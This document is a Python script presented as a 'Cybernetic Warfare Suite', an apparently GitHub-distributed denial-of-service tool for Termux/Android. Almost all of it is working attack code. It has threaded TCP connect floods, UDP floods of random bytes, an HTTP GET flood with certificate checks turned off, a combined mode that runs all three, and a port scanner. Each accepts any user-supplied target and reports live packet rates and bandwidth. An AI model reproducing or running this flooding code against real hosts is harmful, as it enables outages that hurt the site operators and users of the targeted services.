#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Custom Cybernetic Warfare Suite v13.0 (Production Hardened)
Created by Forhadj (GitHub: github.com/Forhadj)
Optimized for Termux/Android with Full Path Retention, Latency & Graceful Shutdown
"""

import socket
import threading
import time
import random
import sys
import os
import requests
from urllib.parse import urlparse, urlunparse
import urllib3
import signal

# Suppress SSL warnings for targeted diagnostic testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration & Branding ---
OPERATOR_NAME = "Forhadj"
GITHUB_PROFILE = "github.com/Forhadj"

# --- Elite Neon & Matrix Colors ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    C = Colors
    banner = f"""
{C.RED}{C.BOLD}  ██████╗ ██████╗ ██████╗ ███████╗
 ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 ██║  ██║██║  ██║██║   ██║███████╗
 ██║  ██║██║  ██║██║   ██║╚════██║
 ██████╔╝██████╔╝╚██████╔╝███████║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{C.CYAN}
 ╔══════════════════════════════════════════╗
 ║       CYBERNETIC WARFARE SUITE           ║
 ╠══════════════════════════════════════════╣
 ║ OPERATOR : {OPERATOR_NAME:<28}║
 ║ GITHUB   : {GITHUB_PROFILE:<28}║
 ║ VERSION  : v13.0 HARDENED              ║
 ╚══════════════════════════════════════════╝
{C.RED}   [ DARK CYBERPUNK EDITION ]
{C.GREEN}   [ TERMUX / ANDROID ]
{C.END}
"""
    print(banner)

# --- Global Control & Thread Safety ---
stop_event = threading.Event()
stats_lock = threading.Lock()
stats = {
    "packets_sent": 0,
    "packets_failed": 0,
    "bytes_sent": 0,
    "http_2xx": 0,
    "http_err": 0,
    "start_time": 0,
}

def reset_stats():
    with stats_lock:
        stats["packets_sent"] = 0
        stats["packets_failed"] = 0
        stats["bytes_sent"] = 0
        stats["http_2xx"] = 0
        stats["http_err"] = 0
        stats["start_time"] = 0

def parse_target(target, custom_port=None):
    try:
        if not target.startswith("http://") and not target.startswith("https://"):
            target = f"http://{target}"
            
        parsed = urlparse(target)
        scheme = parsed.scheme or "http"
        hostname = parsed.hostname or parsed.path.split('/')[0]
        
        # Validate custom port range if provided
        if custom_port is not None:
            if not (1 <= custom_port <= 65535):
                raise ValueError("Port out of valid range (1-65535)")
            port = custom_port
        else:
            port = parsed.port or (443 if scheme == "https" else 80)
            
        # Reconstruct full URL preserving path and query strings
        netloc = f"{hostname}:{port}" if (port != 80 and scheme == "http") or (port != 443 and scheme == "https") else hostname
        path_query = parsed.path + (f"?{parsed.query}" if parsed.query else "")
        if not path_query.startswith('/'):
            path_query = '/' + path_query
            
        full_url = urlunparse((scheme, netloc, path_query, '', '', ''))
        
        return hostname, port, full_url, scheme
    except Exception as e:
        print(f"{Colors.RED}[!] Target Parse Error: {e}{Colors.END}")
        return None, None, None, None

def resolve_target_ip(host):
    try:
        addr_info = socket.getaddrinfo(host, None)
        for entry in addr_info:
            ip = entry[4][0]
            return ip
    except socket.gaierror as e:
        print(f"{Colors.RED}[!] DNS Resolution Failed: {e}{Colors.END}")
        return None

# --- Hardened Attack Modules ---
def tcp_flood_worker(ip, port):
    while not stop_event.is_set():
        try:
            family = socket.AF_INET6 if ":" in ip else socket.AF_INET
            with socket.socket(family, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.connect((ip, port))
                payload = os.urandom(random.randint(128, 512))
                sock.sendall(payload)
                
                with stats_lock:
                    stats["packets_sent"] += 1
                    stats["bytes_sent"] += len(payload)
        except (socket.timeout, socket.error):
            with stats_lock:
                stats["packets_failed"] += 1
        except Exception:
            with stats_lock:
                stats["packets_failed"] += 1
        time.sleep(0.01)

def udp_flood_worker(ip, port):
    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    try:
        sock = socket.socket(family, socket.SOCK_DGRAM)
    except socket.error:
        return
        
    while not stop_event.is_set():
        try:
            payload = os.urandom(random.randint(128, 512))
            sock.sendto(payload, (ip, port))
            with stats_lock:
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(payload)
        except socket.error:
            with stats_lock:
                stats["packets_failed"] += 1
        except Exception:
            with stats_lock:
                stats["packets_failed"] += 1
        time.sleep(0.01)
    try:
        sock.close()
    except:
        pass

def http_storm_worker(url):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "close"
    }
    while not stop_event.is_set():
        try:
            response = session.get(url, headers=headers, timeout=2, verify=False)
            content_len = len(response.content) if response.content else 256
            
            with stats_lock:
                stats["packets_sent"] += 1
                stats["bytes_sent"] += content_len
                if 200 <= response.status_code < 300:
                    stats["http_2xx"] += 1
                else:
                    stats["http_err"] += 1
        except requests.exceptions.RequestException:
            with stats_lock:
                stats["packets_failed"] += 1
        except Exception:
            with stats_lock:
                stats["packets_failed"] += 1
        time.sleep(0.02)
    try:
        session.close()
    except:
        pass

def full_port_scanner(host, start_port=1, end_port=1024):
    print(f"\n{Colors.CYAN}[*] Scanning Port Vector [{start_port} - {end_port}] on {host}...{Colors.END}")
    open_ports = []
    scan_lock = threading.Lock()
    
    def scan_port(p):
        if stop_event.is_set():
            return
        try:
            family = socket.AF_INET6 if ":" in host else socket.AF_INET
            with socket.socket(family, socket.SOCK_STREAM) as s:
                s.settimeout(0.3)
                res = s.connect_ex((host, p))
                if res == 0:
                    with scan_lock:
                        open_ports.append(p)
                    print(f"{Colors.GREEN}[+] OPEN PORT FOUND -> {p}{Colors.END}")
        except Exception:
            pass

    threads = []
    for port in range(start_port, end_port + 1):
        if stop_event.is_set():
            break
        t = threading.Thread(target=scan_port, args=(port,))
        t.daemon = True
        threads.append(t)
        t.start()
        
        if len(threads) >= 100:
            for th in threads:
                th.join(timeout=0.02)
            threads = [th for th in threads if th.is_alive()]

    for th in threads:
        th.join()

    if not open_ports:
        print(f"{Colors.YELLOW}[!] No open ports found in range.{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] Scan Done. Active Ports: {open_ports}{Colors.END}")

def main():
    def signal_handler(sig, frame):
        print(f"\n{Colors.RED}[!] Emergency Override Triggered. Graceful Shutdown...{Colors.END}")
        stop_event.set()
        time.sleep(0.5)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    while True:
        print_banner()
        target_input = input(f"{Colors.MAGENTA} ┌──[{Colors.GREEN}TARGET_URL / IP{Colors.MAGENTA}]\n └──╼ {Colors.END}").strip()
        
        if target_input.lower() in ['exit', 'quit', 'q']:
            print(f"{Colors.GREEN}[+] Shutting down core... Farewell!{Colors.END}")
            break
            
        if not target_input:
            print(f"{Colors.RED}[!] Target vector cannot be empty!{Colors.END}")
            time.sleep(1)
            continue

        custom_port = None
        port_input = input(f"{Colors.MAGENTA} ┌──[{Colors.GREEN}PORT OVERRIDE (Optional){Colors.MAGENTA}]\n └──╼ {Colors.END}").strip()
        if port_input and port_input.isdigit():
            custom_port = int(port_input)

        host, port, url, scheme = parse_target(target_input, custom_port)
        if not host:
            time.sleep(1)
            continue

        resolved_ip = resolve_target_ip(host)
        if not resolved_ip:
            print(f"{Colors.RED}[!] Matrix Resolution Failed. Invalid Target.{Colors.END}")
            time.sleep(1)
            continue
        
        print(f"{Colors.GREEN}[+] Target Lock Secured -> {resolved_ip}:{port}{Colors.END}\n")
        time.sleep(1)

        while True:
            print_banner()
            print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.WHITE}{Colors.BOLD} TARGET URL: {url:<52}{Colors.END}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW} RESOLVED IP: {resolved_ip}:{port:<49}{Colors.END}{Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════════════╝{Colors.END}\n")
            
            print(f"{Colors.GREEN}  [1]{Colors.END} TCP Flood Matrix")
            print(f"{Colors.GREEN}  [2]{Colors.END} UDP Flood Storm")
            print(f"{Colors.GREEN}  [3]{Colors.END} HTTP Request Blitz")
            print(f"{Colors.GREEN}  [4]{Colors.END} Omnidirectional Core (TCP + UDP + HTTP)")
            print(f"{Colors.GREEN}  [5]{Colors.END} Deep Port Scanner")
            print(f"{Colors.YELLOW}  [6]{Colors.END} Switch Target Vector")
            print(f"{Colors.RED}  [7]{Colors.END} Terminate Program\n")
            
            choice = input(f"{Colors.MAGENTA} ┌──[{Colors.GREEN}CHOOSE_ATTACK_VECTOR{Colors.MAGENTA}]\n └──╼ {Colors.END}").strip()
            
            if choice == '7':
                sys.exit(0)
            elif choice == '6':
                break
                
            if choice not in ['1', '2', '3', '4', '5']:
                print(f"{Colors.RED}[!] Invalid Selection Vector!{Colors.END}")
                time.sleep(1)
                continue

            if choice == '5':
                try:
                    s_p = int(input(f"Start Port [1]: ") or 1)
                    e_p = int(input(f"End Port [1024]: ") or 1024)
                except ValueError:
                    s_p, e_p = 1, 1024
                
                stop_event.clear()
                full_port_scanner(resolved_ip, s_p, e_p)
                input(f"\n{Colors.YELLOW}[ Press Enter to return to main control ]{Colors.END}")
                continue

            try:
                duration = int(input(f"Duration [Seconds] (Default 60): ") or 60)
                threads_count = int(input(f"Concurrency Threads (Safe Max 500-1000): ") or 200)
                if threads_count > 1000:
                    print(f"{Colors.YELLOW}[!] Warning: High threads can crash Termux. Auto-capped to 1000.{Colors.END}")
                    threads_count = 1000
            except ValueError:
                duration, threads_count = 60, 200

            mode_map = {"1": "tcp", "2": "udp", "3": "http", "4": "all"}
            selected_mode = mode_map[choice]
            unit_label = "req/s" if selected_mode == "http" else "pkt/s"

            print(f"\n{Colors.RED}[⚡] LAUNCHING LIVE PAYLOAD... WATCH COUNTER BELOW{Colors.END}\n")
            
            reset_stats()
            stop_event.clear()
            threads = []
            stats["start_time"] = time.time()
            
            for i in range(threads_count):
                if selected_mode == "tcp":
                    t = threading.Thread(target=tcp_flood_worker, args=(resolved_ip, port))
                elif selected_mode == "udp":
                    t = threading.Thread(target=udp_flood_worker, args=(resolved_ip, port))
                elif selected_mode == "http":
                    t = threading.Thread(target=http_storm_worker, args=(url,))
                elif selected_mode == "all":
                    choice_type = i % 3
                    if choice_type == 0:
                        t = threading.Thread(target=tcp_flood_worker, args=(resolved_ip, port))
                    elif choice_type == 1:
                        t = threading.Thread(target=udp_flood_worker, args=(resolved_ip, port))
                    else:
                        t = threading.Thread(target=http_storm_worker, args=(url,))
                
                t.daemon = True
                threads.append(t)
                t.start()
                
            try:
                end_time = time.time() + duration
                while time.time() < end_time and not stop_event.is_set():
                    time.sleep(0.5)
                    with stats_lock:
                        elapsed = time.time() - stats["start_time"]
                        speed = stats["packets_sent"] / elapsed if elapsed > 0 else 0
                        mbps = (stats["bytes_sent"] * 8) / (elapsed * 1024 * 1024) if elapsed > 0 else 0
                        
                        if selected_mode == "http":
                            sys.stdout.write(f"\r{Colors.CYAN}[⚡] Sent: {Colors.GREEN}{stats['packets_sent']}{Colors.CYAN} | 2xx: {Colors.GREEN}{stats['http_2xx']}{Colors.CYAN} | Err/Fail: {Colors.RED}{stats['packets_failed']+stats['http_err']}{Colors.CYAN} | Speed: {speed:.1f} {unit_label} | BW: {mbps:.2f} Mbps{Colors.END}          ")
                        else:
                            sys.stdout.write(f"\r{Colors.CYAN}[⚡] Sent Packets: {Colors.GREEN}{stats['packets_sent']}{Colors.CYAN} | Failed: {Colors.RED}{stats['packets_failed']}{Colors.CYAN} | Speed: {speed:.1f} {unit_label} | BW: {mbps:.2f} Mbps{Colors.END}          ")
                        sys.stdout.flush()
            except KeyboardInterrupt:
                pass
                
            stop_event.set()
            print(f"\n{Colors.YELLOW}[*] Stopping threads gracefully...{Colors.END}")
            for t in threads:
                t.join(timeout=0.1)
            
            print(f"\n{Colors.GREEN}[+] Attack sequence finished successfully.{Colors.END}")
            input(f"{Colors.YELLOW}[ Press Enter to reboot command panel ]{Colors.END}")

if __name__ == "__main__":
    main()
